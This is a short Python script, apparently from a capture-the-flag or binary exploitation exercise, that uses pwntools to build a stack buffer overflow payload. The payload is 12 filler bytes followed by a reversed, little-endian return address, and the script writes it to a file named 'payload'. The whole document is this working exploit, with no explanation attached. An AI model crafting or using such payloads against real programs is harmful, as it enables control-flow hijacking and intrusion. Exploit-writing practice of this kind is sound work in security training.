#!/usr/bin/env python3

from pwn import *

payload = b"a" * 12 + b"\x00\x00\x55\x55\x55\x55\x51\xb9"[::-1]

with open("payload", "wb") as f:
    f.write(payload)
